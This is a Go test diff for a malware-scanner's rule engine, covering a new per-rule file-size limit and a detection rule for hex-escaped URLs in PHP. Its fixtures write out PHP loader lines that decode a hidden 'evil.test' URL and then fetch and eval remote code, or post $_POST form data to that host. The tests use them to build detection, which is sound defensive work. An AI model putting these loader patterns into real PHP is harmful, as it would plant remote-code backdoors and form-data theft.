@@ -73,6 +73,91 @@ func TestMaxFileBytesBoundsRuleByContentSize(t *testing.T) {
 	}
 }
 
+func TestMaxFileBytesDefaultsToUnbounded(t *testing.T) {
+	dir := t.TempDir()
+	rules := `version: 1
+rules:
+  - name: unbounded
+    file_types: [".php"]
+    patterns: ["BOUNDARY_TOKEN"]
+  - name: bounded
+    file_types: [".php"]
+    max_file_bytes: 1024
+    patterns: ["BOUNDARY_TOKEN"]
+`
+	if err := os.WriteFile(filepath.Join(dir, "limits.yml"), []byte(rules), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	scanner := NewScanner(dir)
+	if err := scanner.LoadError(); err != nil {
+		t.Fatalf("loading size-limit rules: %v", err)
+	}
+	content := []byte(strings.Repeat("x", 2048) + "BOUNDARY_TOKEN")
+	matches := scanner.ScanContent(content, ".php")
+	if !hasRule(matches, "unbounded") {
+		t.Error("rule without max_file_bytes did not retain the unbounded default")
+	}
+	if hasRule(matches, "bounded") {
+		t.Error("bounded rule matched content above max_file_bytes")
+	}
+}
+
+func TestRepoMaxFileBytesIsExplicitlyOptIn(t *testing.T) {
+	scanner := loadRepoScanner(t)
+	for _, rule := range scanner.rules {
+		if rule.Name == "php_hex_escaped_url" {
+			if rule.MaxFileBytes != 65536 {
+				t.Errorf("php_hex_escaped_url max_file_bytes = %d, want 65536", rule.MaxFileBytes)
+			}
+			continue
+		}
+		if rule.MaxFileBytes != 0 {
+			t.Errorf("existing rule %s unexpectedly opted into max_file_bytes=%d", rule.Name, rule.MaxFileBytes)
+		}
+	}
+}
+
+func TestMaxFileBytesUsesCompleteSizeForScannedPrefix(t *testing.T) {
+	scanner := loadRepoScanner(t)
+	escaped := []byte(`<?php $url = "\x68\x74\x74\x70\x3a\x2f\x2f\x65\x76\x69\x6c";`)
+	if !hasRule(scanner.ScanContent(escaped, ".php"), "php_hex_escaped_url") {
+		t.Fatal("setup: escaped URL prefix should match when it is the complete content")
+	}
+	if hasRule(scanner.ScanContentWithSize(escaped, ".php", 110000), "php_hex_escaped_url") {
+		t.Error("max_file_bytes used the truncated prefix length instead of the complete snapshot size")
+	}
+	padded := append(append([]byte{}, escaped...), make([]byte, 70000)...)
+	if hasRule(scanner.ScanContentWithSize(padded, ".php", 1), "php_hex_escaped_url") {
+		t.Error("max_file_bytes trusted a declared size smaller than the supplied content")
+	}
+}
+
+func TestHexEscapedURL_OversizedLoaderFlowsStillFlagged(t *testing.T) {
+	scanner := loadRepoScanner(t)
+	escaped := `"\x68\x74\x74\x70\x3a\x2f\x2f\x65\x76\x69\x6c\x2e\x74\x65\x73\x74"`
+	longEscaped := `"\x68\x74\x74\x70\x3a\x2f\x2f` + strings.Repeat(`\x61`, 240) + `"`
+	prefixedEscaped := `"` + strings.Repeat(`\x61`, 80) + `\x68\x74\x74\x70\x3a\x2f\x2f\x65\x76\x69\x6c"`
+	for _, prefix := range []string{
+		`<?php $payload = file_get_contents(` + escaped + `);`,
+		`<?php include ` + escaped + `;`,
+		`<?php curl_setopt($handle, CURLOPT_URL, ` + escaped + `); $payload = curl_exec($handle); eval($payload);`,
+		`<?php $url = ` + escaped + `; require_once $url;`,
+		`<?php $url = ` + escaped + `; $payload = file_get_contents($url); eval($payload);`,
+		`<?php $url = ` + longEscaped + `; $payload = file_get_contents($url); eval($payload);`,
+		`<?php $url = ` + prefixedEscaped + `; $payload = file_get_contents($url); eval($payload);`,
+		`<?php $endpoint = ` + escaped + `; wp_remote_post($endpoint, array('body' => $_POST));`,
+		`<?php $url = ` + escaped + `; curl_setopt($handle, CURLOPT_URL, $url); curl_setopt($handle, CURLOPT_POSTFIELDS, $_POST);`,
+	} {
+		content := []byte(prefix + strings.Repeat("\nfunction ordinary_padding($v) { return trim($v); }", 1600))
+		if len(content) <= 65536 {
+			t.Fatalf("setup: oversized loader fixture is only %d bytes", len(content))
+		}
+		if !hasRule(scanner.ScanContent(content, ".php"), "php_hex_escaped_url") {
+			t.Errorf("php_hex_escaped_url regression: oversized escaped-URL loader flow not detected: %s", prefix)
+		}
+	}
+}
+
 // The suppressed Forge rule must stay suppressed, and its replacement must
 // carry the campaign's own markers so suppression never costs detection.
 func TestForgeSuppressedIncludesIISGroup14(t *testing.T) {
